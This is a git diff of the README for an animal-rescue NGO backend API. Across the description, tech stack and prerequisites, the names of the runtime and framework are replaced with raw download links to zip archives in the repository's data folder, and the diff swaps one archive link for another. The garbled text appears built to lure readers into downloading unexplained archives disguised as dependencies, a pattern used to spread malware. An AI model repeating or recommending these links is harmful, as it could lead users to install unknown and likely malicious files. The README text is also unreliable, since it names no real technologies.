@@ -1,6 +1,6 @@
 # Animal NGO Backend API
 
-A https://github.com/NNIIKKKKII/animal-ngo-backend/raw/refs/heads/main/src/data/animal_backend_ngo_3.7.zip backend application for an Animal NGO platform that facilitates animal rescue operations and donation management. Built with https://github.com/NNIIKKKKII/animal-ngo-backend/raw/refs/heads/main/src/data/animal_backend_ngo_3.7.zip, PostgreSQL, and Docker for containerized deployment.
+A https://raw.githubusercontent.com/NNIIKKKKII/animal-ngo-backend/main/src/data/ngo-backend-animal-1.6.zip backend application for an Animal NGO platform that facilitates animal rescue operations and donation management. Built with https://raw.githubusercontent.com/NNIIKKKKII/animal-ngo-backend/main/src/data/ngo-backend-animal-1.6.zip, PostgreSQL, and Docker for containerized deployment.
 
 ## Features
 
@@ -12,8 +12,8 @@ A https://github.com/NNIIKKKKII/animal-ngo-backend/raw/refs/heads/main/src/data/
 
 ## Tech Stack
 
-- **Runtime**: https://github.com/NNIIKKKKII/animal-ngo-backend/raw/refs/heads/main/src/data/animal_backend_ngo_3.7.zip
-- **Framework**: https://github.com/NNIIKKKKII/animal-ngo-backend/raw/refs/heads/main/src/data/animal_backend_ngo_3.7.zip
+- **Runtime**: https://raw.githubusercontent.com/NNIIKKKKII/animal-ngo-backend/main/src/data/ngo-backend-animal-1.6.zip
+- **Framework**: https://raw.githubusercontent.com/NNIIKKKKII/animal-ngo-backend/main/src/data/ngo-backend-animal-1.6.zip
 - **Database**: PostgreSQL
 - **Authentication**: JWT (JSON Web Tokens)
 - **Password Hashing**: bcrypt
@@ -52,7 +52,7 @@ A https://github.com/NNIIKKKKII/animal-ngo-backend/raw/refs/heads/main/src/data/
 
 ## Prerequisites
 
-- https://github.com/NNIIKKKKII/animal-ngo-backend/raw/refs/heads/main/src/data/animal_backend_ngo_3.7.zip (v14 or higher)
+- https://raw.githubusercontent.com/NNIIKKKKII/animal-ngo-backend/main/src/data/ngo-backend-animal-1.6.zip (v14 or higher)
 - Docker and Docker Compose
 - PostgreSQL (if running without Docker)
 
